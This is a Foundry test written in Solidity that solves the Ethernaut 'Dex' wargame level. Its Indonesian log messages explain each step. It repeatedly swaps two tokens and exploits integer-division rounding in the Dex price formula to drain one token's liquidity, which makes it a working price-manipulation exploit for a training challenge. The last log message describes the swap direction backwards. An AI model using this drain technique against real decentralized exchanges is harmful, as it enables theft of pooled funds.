// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "../Ethernaut.sol";
import "../23-Dex/DexFactory.sol";
import "forge-std/Test.sol";

contract DexAttack is Test {
    function testDex() external {
        vm.createSelectFork(vm.envString("sepolia"));
        Ethernaut ethernaut = new Ethernaut();
        DexFactory factory = new DexFactory();
        ethernaut.registerLevel(factory);
        address trader = makeAddr("trader");
        vm.startPrank(trader, trader);
        address addr = ethernaut.createLevelInstance(factory);
        Dex dex = Dex(addr);
        bool adaLiq = ERC20(dex.token1()).balanceOf(address(dex)) != 0;
        assertTrue(adaLiq);
        emit log("Goal: habiskan likuiditas salah satu token");
        emit log("===============================");
        emit log("harga token X terhadap token Y = jumlah token X * likuiditas token Y / likuiditas token X");
        emit log("token1 = 10, token2 = 10, liqToken1 = 100, liqToken2 = 100");
        address token1 = dex.token1();
        address token2 = dex.token2();
        dex.approve(address(dex), type(uint256).max);
        dex.swap(token1, token2, 10);
        assertEq(ERC20(token2).balanceOf(trader), 20);
        assertEq(ERC20(token1).balanceOf(address(dex)), 110);
        assertEq(ERC20(token2).balanceOf(address(dex)), 90);
        emit log("token1 = 0, token2 = 20, liqToken1 = 110, liqToken2 = 90");
        dex.swap(token2, token1, 20);
        assertEq(ERC20(token1).balanceOf(trader), 24);
        assertEq(ERC20(token1).balanceOf(address(dex)), 86);
        assertEq(ERC20(token2).balanceOf(address(dex)), 110);
        emit log(
            "solidity tidak mengenal floating point. jika hasil pembagian bukan bilangan bulat, akan dibulatkan ke bawah."
        );
        emit log("token1 = 24, token2 = 0, liqToken1 = 86, liqToken2 = 110");
        dex.swap(token1, token2, 24);
        assertEq(ERC20(token2).balanceOf(trader), 30);
        assertEq(ERC20(token1).balanceOf(address(dex)), 110);
        assertEq(ERC20(token2).balanceOf(address(dex)), 80);
        emit log("token1 = 0, token2 = 30, liqToken1 = 110, liqToken2 = 80");
        dex.swap(token2, token1, 30);
        assertEq(ERC20(token1).balanceOf(trader), 41);
        assertEq(ERC20(token1).balanceOf(address(dex)), 69);
        assertEq(ERC20(token2).balanceOf(address(dex)), 110);
        emit log("token1 = 41, token2 = 0, liqToken1 = 69, liqToken2 = 110");
        dex.swap(token1, token2, 41);
        assertEq(ERC20(token2).balanceOf(trader), 65);
        assertEq(ERC20(token1).balanceOf(address(dex)), 110);
        assertEq(ERC20(token2).balanceOf(address(dex)), 45);
        emit log("token1 = 0, token2 = 65, liqToken1 = 110, liqToken2 = 45");
        emit log("untuk menghabiskan likuiditas token2 yang tersisa 45 token, tinggal swap 45 token1 ke token2");
        dex.swap(token2, token1, 45);
        bool sukses = ethernaut.submitLevelInstance(payable(addr));
        assertTrue(sukses);
    }
}
